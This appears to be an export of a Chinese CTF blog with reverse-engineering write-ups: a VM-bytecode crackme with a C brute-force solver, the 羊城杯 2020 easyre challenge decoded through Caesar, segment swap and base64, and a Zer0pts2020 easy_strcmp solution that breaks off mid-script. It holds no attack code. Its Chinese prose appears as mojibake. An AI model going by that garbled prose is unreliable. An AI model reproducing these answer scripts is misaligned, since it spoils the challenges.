v9; <span class="comment">// [esp+ECh] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = v9;</span><br><span class="line">    <span class="keyword">if</span> ( v9 &gt;= a2 )</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    <span class="keyword">switch</span> ( a1[v9] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        Str[v6 + <span class="number">100</span>] = v4;</span><br><span class="line">        ++v9;</span><br><span class="line">        ++v6;</span><br><span class="line">        ++v8;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        v4 = a1[v9 + <span class="number">1</span>] + Str[v8];</span><br><span class="line">        v9 += <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        v4 = Str[v8] - LOBYTE(a1[v9 + <span class="number">1</span>]);</span><br><span class="line">        v9 += <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        v4 = a1[v9 + <span class="number">1</span>] ^ Str[v8];</span><br><span class="line">        v9 += <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        v4 = a1[v9 + <span class="number">1</span>] * Str[v8];</span><br><span class="line">        v9 += <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">        ++v9;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">        <span class="keyword">if</span> ( Str[v7 + <span class="number">100</span>] != a1[v9 + <span class="number">1</span>] )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;what a shame...&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        ++v7;</span><br><span class="line">        v9 += <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">        Str[v5] = v4;</span><br><span class="line">        ++v9;</span><br><span class="line">        ++v5;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line">        read(Str);</span><br><span class="line">        ++v9;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">11</span>:</span><br><span class="line">        v4 = Str[v8] - <span class="number">1</span>;</span><br><span class="line">        ++v9;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">12</span>:</span><br><span class="line">        v4 = Str[v8] + <span class="number">1</span>;</span><br><span class="line">        ++v9;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ä¼šå‘ç°ç¬¬ä¸€ä¸ªå‚æ•°a1æ˜¯intï¼Œå 4ä½ï¼Œæ˜¯dword</p><p>æŠŠunk_403040è½¬æ¢æˆdwordå½¢å¼ç„¶åå¯¼å‡ºã€‚</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E9%9D%92%E9%BE%99%E7%BB%84%5Dsingal/unk.png" alt="unk"></p><p>è¿™é‡Œæœ‰å‡ ä¸ªè¡¥ç å½¢å¼çš„æ•°å­—ï¼Œæˆ‘ä¹Ÿä¸çŸ¥é“idaä¸ºä»€ä¹ˆä¼šé€†æˆè¿™æ ·ï¼Œæ€»ä¹‹çœ‹æœ€åä¸€ä½æ•°å­—å°±å¯¹äº†</p><p>è¿™é‡Œè¯´ä¸‹å‡ ä¸ªéƒ¨åˆ†çš„ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        Str[v6 + <span class="number">100</span>] = v4;</span><br><span class="line">        ++v9;</span><br><span class="line">        ++v6;</span><br><span class="line">        ++v8;</span><br></pre></td></tr></table></figure><p>è¿™æ˜¯å°†Str[100]å’Œä¹‹åçš„ä¸€æ®µç©ºé—´ç”¨æ¥å‚¨å­˜v4</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">       <span class="keyword">if</span> ( Str[v7 + <span class="number">100</span>] != a1[v9 + <span class="number">1</span>] )</span><br><span class="line">       &#123;</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;what a shame...&quot;</span>);</span><br><span class="line">         <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">       &#125;</span><br><span class="line">        ++v7;</span><br><span class="line">       v9 += <span class="number">2</span>;</span><br><span class="line">       <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>è¿™æ˜¯ç»è¿‡äº†ä¸€æ®µæ“ä½œï¼Œç„¶åå°†æ˜æ–‡åŠ å¯†åçš„ç»“æœå’Œé¢„ç•™å¯†æ–‡åšæ¯”å¯¹</p><p>è¿™ä¹Ÿè¯´æ˜äº†æ˜¯7åé¢çš„æ•°å­—å°±æ˜¯å¯†æ–‡</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Str[v8]</span><br></pre></td></tr></table></figure><p> è¿™å¯ä»¥è§†ä¸ºä¸€ä¸ªæš‚å­˜ä½ï¼Œå› ä¸ºåé¢è¿˜éœ€è¦ç”¨Str[v8]è¿›è¡Œè®¡ç®—æ“ä½œå­˜åˆ°v4ç„¶åç»è¿‡case 1æ“ä½œå­˜åˆ°Str[100+]</p><p>åŸºæœ¬æŠŠä¸æ˜ç‚¹è¯´çš„å·®ä¸å¤šäº†ï¼Œå†™ä¸ªçˆ†ç ´è„šæœ¬å§</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> key[] = &#123;<span class="number">34</span>, <span class="number">63</span>, <span class="number">52</span>, <span class="number">50</span>, <span class="number">114</span>, <span class="number">51</span>, <span class="number">24</span>, <span class="number">167</span>, <span class="number">49</span>, <span class="number">241</span>, <span class="number">40</span>, <span class="number">132</span>, <span class="number">193</span>, <span class="number">30</span>, <span class="number">122</span>&#125;;</span><br><span class="line"><span class="type">int</span> a1[] =&#123;<span class="number">4</span>, <span class="number">16</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">32</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">1</span>, <span class="number">12</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">33</span>, <span class="number">1</span>, <span class="number">11</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">32</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">81</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">36</span>, <span class="number">1</span>, <span class="number">12</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">2</span>, <span class="number">37</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">54</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">65</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">32</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">8</span>, <span class="number">2</span>, <span class="number">37</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">32</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">65</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">34</span>, <span class="number">7</span>, <span class="number">63</span>, <span class="number">7</span>, <span class="number">52</span>, <span class="number">7</span>, <span class="number">50</span>, <span class="number">7</span>, <span class="number">114</span>, <span class="number">7</span>, <span class="number">51</span>, <span class="number">7</span>, <span class="number">24</span>, <span class="number">7</span>, <span class="number">167</span>, <span class="number">7</span>, <span class="number">49</span>, <span class="number">7</span>, <span class="number">241</span>, <span class="number">7</span>, <span class="number">40</span>, <span class="number">7</span>, <span class="number">132</span>, <span class="number">7</span>, <span class="number">193</span>, <span class="number">7</span>, <span class="number">30</span>, <span class="number">7</span>, <span class="number">122</span>&#125;;</span><br><span class="line"><span class="type">int</span> v9 = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> v4 = <span class="number">0</span>; </span><br><span class="line"><span class="type">int</span> i, j;</span><br><span class="line"><span class="type">int</span> flag;</span><br><span class="line"><span class="type">int</span> index = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">15</span>; i++, index++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> ( j = <span class="number">48</span>; j &lt; <span class="number">123</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line">flag = j;</span><br><span class="line">v9 = index;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> ( a1[v9] != <span class="number">1</span>)</span><br><span class="line">  &#123;</span><br><span class="line"><span class="keyword">switch</span> ( a1[v9] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        v4 = a1[v9 + <span class="number">1</span>] + flag;</span><br><span class="line">        v9 += <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        v4 = flag - a1[v9 + <span class="number">1</span>];</span><br><span class="line">        v9 += <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        v4 = a1[v9 + <span class="number">1</span>] ^ flag;</span><br><span class="line">        v9 += <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        v4 = a1[v9 + <span class="number">1</span>] * flag;</span><br><span class="line">        v9 += <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">        ++v9;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">        flag = v4;</span><br><span class="line">        ++v9;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">11</span>:</span><br><span class="line">       v4 = flag - <span class="number">1</span>;</span><br><span class="line">        ++v9;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">12</span>:</span><br><span class="line">        v4 = flag + <span class="number">1</span>;</span><br><span class="line">        ++v9;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">if</span> ( v4 == key[i])</span><br><span class="line">    &#123;</span><br><span class="line">    index = v9;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, j);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"> &#125;</span><br><span class="line">  <span class="built_in">getchar</span> (); </span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>indexè¡¨ç¤ºçš„æ˜¯å½“å‰v9çš„ä½ç½®ï¼Œåœ¨çˆ†ç ´è¿‡ç¨‹ä¸­å¦‚æœæœ‰ä¸ªæ•°å­—ç¬¦åˆå½“å‰æ“ä½œï¼Œéœ€è¦è¿›è¡Œä¸‹ä¸€ä¸ªæ“ä½œï¼Œæ‰€ä»¥éœ€è¦indexæš‚å­˜ä¸€ä¸‹</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ã€ç¾ŠåŸæ¯ 2020ã€‘easyre</title>
      <link href="/2024/07/19/%5B%E7%BE%8A%E5%9F%8E%E6%9D%AF%202020%5Deasyre/"/>
      <url>/2024/07/19/%5B%E7%BE%8A%E5%9F%8E%E6%9D%AF%202020%5Deasyre/</url>
      
        <content type="html"><![CDATA[<h1 id="ç¾ŠåŸæ¯-2020-easyre"><a href="#ç¾ŠåŸæ¯-2020-easyre" class="headerlink" title="[ç¾ŠåŸæ¯ 2020]easyre"></a>[ç¾ŠåŸæ¯ 2020]easyre</h1><h3 id="è¿™é¢˜ä¸­ä¸ºäº†æ–¹ä¾¿ï¼Œ"><a href="#è¿™é¢˜ä¸­ä¸ºäº†æ–¹ä¾¿ï¼Œ" class="headerlink" title="è¿™é¢˜ä¸­ä¸ºäº†æ–¹ä¾¿ï¼Œ"></a>è¿™é¢˜ä¸­ä¸ºäº†æ–¹ä¾¿ï¼Œ</h3><h3 id="ç¬¬ä¸€æ¬¡åŠ å¯†çš„å¯†æ–‡å«enc1ï¼Œ"><a href="#ç¬¬ä¸€æ¬¡åŠ å¯†çš„å¯†æ–‡å«enc1ï¼Œ" class="headerlink" title="ç¬¬ä¸€æ¬¡åŠ å¯†çš„å¯†æ–‡å«enc1ï¼Œ"></a>ç¬¬ä¸€æ¬¡åŠ å¯†çš„å¯†æ–‡å«enc1ï¼Œ</h3><h3 id="ç¬¬äºŒæ¬¡åŠ å¯†åå«enc2ï¼Œ"><a href="#ç¬¬äºŒæ¬¡åŠ å¯†åå«enc2ï¼Œ" class="headerlink" title="ç¬¬äºŒæ¬¡åŠ å¯†åå«enc2ï¼Œ"></a>ç¬¬äºŒæ¬¡åŠ å¯†åå«enc2ï¼Œ</h3><h3 id="ç¬¬ä¸‰æ¬¡åŠ å¯†åå«enc3"><a href="#ç¬¬ä¸‰æ¬¡åŠ å¯†åå«enc3" class="headerlink" title="ç¬¬ä¸‰æ¬¡åŠ å¯†åå«enc3"></a>ç¬¬ä¸‰æ¬¡åŠ å¯†åå«enc3</h3><p>exeå·®å£³æ— å£³idaå‘ç°æœ‰ä¸€ä¸²ç–‘ä¼¼base64çš„å¯†æ–‡å’Œ3ä¸ªåŠ å¯†å‡½æ•°</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%E3%80%90%E7%BE%8A%E5%9F%8E%E6%9D%AF%202020%E3%80%91easyre/main.png" alt="main"></p><p>ä¸‰ä¸ªï¼Œè¶³è¶³ä¸‰ä¸ªï¼Œåˆšçœ‹è¿˜æ˜¯è§‰å¾—æœ‰ç‚¹å“äººï¼Œå†·é™ä¸‹æ¥åˆ†æ</p><p>æ˜¯æ˜æ–‡ç»è¿‡3è½®åŠ å¯†å˜æˆå¯†æ–‡ï¼Œç„¶åå¯†æ–‡å’Œç»™å‡ºçš„ç–‘ä¼¼base64çš„å­—ç¬¦è¿›è¡Œæ¯”å¯¹</p><p><strong>æ‰€ä»¥ç–‘ä¼¼base64çš„å­—ç¬¦ä¸²å°±æ˜¯enc3</strong></p><p>å…ˆä»ç¬¬ä¸‰åŠ å¯†ä¸ªå¼€å§‹åˆ†æ</p><p>è·Ÿè¿›encode_three</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%E3%80%90%E7%BE%8A%E5%9F%8E%E6%9D%AF%202020%E3%80%91easyre/enc3.png" alt="en3"></p><p>è¿™æ˜¯ä¸ªå‡¯æ’’åŠ å¯†ï¼Œå¤§å†™å­—æ¯ï¼Œå°å†™å­—æ¯ï¼Œæ•°å­—åˆ†åˆ«åœ¨è‡ªå·±çš„èŒƒå›´ä¸­æ›¿æ¢æˆ<strong>enc2</strong>å­—æ¯åæ•°ç¬¬3ä¸ªå­—æ¯<strong>ï¼ˆè¿™é‡Œçš„æ˜æ–‡æ˜¯ç»è¿‡å‰ä¸¤è½®åŠ å¯†åçš„å¯†æ–‡ï¼‰</strong></p><p>å†™ä¸ªè„šæœ¬ç»™æ¢å›æ¥ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">caesar_cipher</span>(<span class="params">text, shift</span>):</span><br><span class="line">    result = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> text:</span><br><span class="line">        <span class="comment"># å¦‚æœæ˜¯å¤§å†™å­—æ¯</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;A&#x27;</span> &lt;= char &lt;= <span class="string">&#x27;Z&#x27;</span>:</span><br><span class="line">            new_char = <span class="built_in">chr</span>((<span class="built_in">ord</span>(char) - <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) - shift) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>))</span><br><span class="line">            result.append(new_char)</span><br><span class="line">        <span class="comment"># å¦‚æœæ˜¯å°å†™å­—æ¯</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&#x27;a&#x27;</span> &lt;= char &lt;= <span class="string">&#x27;z&#x27;</span>:</span><br><span class="line">            new_char = <span class="built_in">chr</span>((<span class="built_in">ord</span>(char) - <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) - shift) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>))</span><br><span class="line">            result.append(new_char)</span><br><span class="line">        <span class="comment"># å¦‚æœæ˜¯æ•°å­—</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&#x27;0&#x27;</span> &lt;= char &lt;= <span class="string">&#x27;9&#x27;</span>:</span><br><span class="line">            new_char = <span class="built_in">chr</span>((<span class="built_in">ord</span>(char) - <span class="built_in">ord</span>(<span class="string">&#x27;0&#x27;</span>) - shift) % <span class="number">10</span> + <span class="built_in">ord</span>(<span class="string">&#x27;0&#x27;</span>))</span><br><span class="line">            result.append(new_char)</span><br><span class="line">        <span class="comment"># å…¶ä»–å­—ç¬¦ä¸å˜</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result.append(char)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(result)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æµ‹è¯•å‡¯æ’’å¯†ç </span></span><br><span class="line">text = <span class="string">&quot;EmBmP5Pmn7QcPU4gLYKv5QcMmB3PWHcP5YkPq3=cT6QckkPckoRG&quot;</span></span><br><span class="line">shift = <span class="number">3</span></span><br><span class="line">encrypted_text = caesar_cipher(text, shift)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Encrypted Text:&quot;</span>, encrypted_text)</span><br></pre></td></tr></table></figure><hr><p>æ¢è¿‡æ¥åè·Ÿè¿›ç¬¬äºŒä¸ªåŠ å¯†</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%E3%80%90%E7%BE%8A%E5%9F%8E%E6%9D%AF%202020%E3%80%91easyre/enc2.png" alt="enc2"></p><p>è¿™æ˜¯æŠŠ<strong>en2åˆ†æˆ4ä¸ªéƒ¨åˆ†</strong>ï¼Œè€Œ<strong>en2</strong>é•¿åº¦åˆšå¥½æ˜¯52ï¼Œ<strong>æ°å¥½ç¬¦åˆæ¯æ®µ13ä¸ªå­—ç¬¦</strong></p><p>è¿™æ®µåŠ å¯†æ˜¯å§æ˜æ–‡çš„4ä¸ªéƒ¨åˆ†è¿›è¡Œäº†ä½ç½®äº¤æ¢ï¼Œ</p><p>æ˜æ–‡ç¬¬ä¸‰æ®µâ†’å¯†æ–‡ç¬¬ä¸€æ®µ</p><p>æ˜æ–‡ç¬¬ä¸€æ®µâ†’å¯†æ–‡ç¬¬äºŒæ®µ</p><p>æ˜æ–‡ç¬¬å››æ®µâ†’å¯†æ–‡ç¬¬ä¸‰æ®µ</p><p>æ˜æ–‡ç¬¬äºŒæ®µâ†’å¯†æ–‡ç¬¬å››æ®µ</p><p> <strong>æ‰€ä»¥åªéœ€è¦æŠŠæ¯æ®µå¯†æ–‡æ¢å›å»å°±èƒ½ç­‰å‡ºenc1</strong></p><hr><p>æœ€åçœ‹ç¬¬ä¸€ä¸ªåŠ å¯†</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%E3%80%90%E7%BE%8A%E5%9F%8E%E6%9D%AF%202020%E3%80%91easyre/enc1.png" alt="enc1"></p><p>å…¶ä¸­alphabetæ˜¯æ ‡å‡†base64è¡¨</p><p>è·Ÿè¿›cmove_bitsåå°±æ˜¯æˆ‘å†™çš„æ³¨é‡Šå†…å®¹</p><p>ç»¼åˆæ¥çœ‹å°±æ˜¯ä¸€ä¸ªæ ‡å‡†çš„base64ï¼Œ</p><p>æ‰€ä»¥æŠŠenc1äº¤ç»™è§£å¯†ç½‘ç«™å°±å¥½äº†</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%E3%80%90%E7%BE%8A%E5%9F%8E%E6%9D%AF%202020%E3%80%91easyre/decory.png" alt="decory"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ã€Hooké€†å‘ã€‘ã€buuã€‘[Zer0pts2020]easy_strcmp</title>
      <link href="/2024/07/19/%E3%80%90buu%E3%80%91%5BZer0pts2020%5Deasy%20strcmp/"/>
      <url>/2024/07/19/%E3%80%90buu%E3%80%91%5BZer0pts2020%5Deasy%20strcmp/</url>
      
        <content type="html"><![CDATA[<h1 id="ã€buuã€‘-Zer0pts2020-easy-strcmp"><a href="#ã€buuã€‘-Zer0pts2020-easy-strcmp" class="headerlink" title="ã€buuã€‘[Zer0pts2020]easy_strcmp"></a>ã€buuã€‘[Zer0pts2020]easy_strcmp</h1><p>elfæ–‡ä»¶æ‹–å…¥idaä¸­æŸ¥çœ‹mainæ²¡å•¥å¤§ç”¨ï¼Œæ ¹æ®é¢˜ç›®è·Ÿè¿›strcmpä¹Ÿè¿˜æ˜¯åŸæ¥çš„æ­£å¸¸çš„strcmp</p><p>åŠ¨è°ƒçœ‹ä¸€ä¸‹å‘ç°strcmpçš„å‡½æ•°å˜äº†ï¼Œ</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BZer0pts2020%5Deasy%20strcmp/strcmp.png" alt="strcmp"></p><p>a1æ˜¯æˆ‘ä»¬è¦è¾“å…¥çš„flagï¼Œa2æ˜¯è¿™ä¸ªè¦æ¯”å¯¹çš„å­—ç¬¦ä¸²</p><p>ç¬¬ä¸€æ¡è¯­å¥æ˜¯è¦è®¡ç®—a1çš„é•¿åº¦ï¼ŒæŠ½è±¡å§</p><p>v4æ˜¯æ›´ä¸ºæŠ½è±¡çš„ï¼Œå“ªä¸ªä½è¿ç®—å®é™…ä¸Šåº”å½“æ˜¯i&#x2F;8ï¼ŒæŠŠa1çš„å­—ç¬¦ä¸²8ä¸ªåˆ†ä¸ºä¸€ç»„</p><p>ç»“åˆä¸‹é¢çš„å¾ªç¯ä¼šå‘ç° <strong>i&#x3D;24</strong>å› ä¸ºqword_5C2570201060æœ‰3ç»„ æœ‰ç”¨çš„8ä½æ•°æ®</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BZer0pts2020%5Deasy%20strcmp/qword060.png" alt="strcmp"></p><p>qword_5C2570201060[0]æ˜¯0ä¸ç”¨ç®¡</p><p>ä»qword_5C2570201060[1]å¼€å§‹æ€è€ƒ</p><p>æ¯æ¬¡è¾“å…¥çš„å­—ç¬¦ä¸²éƒ½è¦å’Œqword_5C2570201060[1]è¿›è¡Œç›¸å‡</p><p>æœ€åçš„qword_5C2570201090(a1, a2)ç–‘ä¼¼å˜æˆäº†strcmp</p><p>æ‰€ä»¥è„šæœ¬åº”ä¸º</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">enc = <span class="string">&quot;********CENSORED********&quot;</span></span><br><span class="line">key = [<span class="number">0x410A4335494A0942</span>, <span class="number">0x0B0EF2F50BE619F0</span>, <span class="number">0x4F0A3A064A35282B</span>]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line"><span class="comment"># åˆ‡ç‰‡æ“ä½œ</span></span><br><span class="line">    <span class="comment"># sub_string = enc[start:end]</span></span><br><span 